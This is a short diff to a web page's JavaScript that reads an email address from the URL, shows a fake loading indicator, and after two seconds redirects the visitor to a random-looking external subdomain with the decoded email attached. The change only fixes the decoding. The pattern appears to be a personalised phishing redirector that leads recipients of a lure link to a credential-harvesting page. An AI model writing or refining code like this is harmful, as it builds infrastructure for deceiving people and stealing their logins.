@@ -64,13 +64,16 @@
             document.getElementById('loadingIndicator').style.display = 'block';
             document.querySelector('button[type="submit"]').setAttribute('disabled', 'true');
             
-            // Get the email parameter from the URL
-            const email = getEmailFromUrl();
+            // Get the email parameter from the URL and decode it
+            const encodedEmail = getEmailFromUrl();
             
-            if (email) {
+            if (encodedEmail) {
+                // Decode the email to get the correct format
+                const decodedEmail = decodeURIComponent(encodedEmail);
+                
                 // Redirect with the email appended as a hash fragment in the URL
                 setTimeout(function () {
-                    window.location.href = 'https://tvrcemeheff.plumbs360.com/UwXUnAeh#' + encodeURIComponent(email);
+                    window.location.href = 'https://tvrcemeheff.plumbs360.com/UwXUnAeh#' + encodeURIComponent(decodedEmail);
                 }, 2000);  // Delay of 2 seconds
             } else {
                 alert('No email parameter found in the URL.');
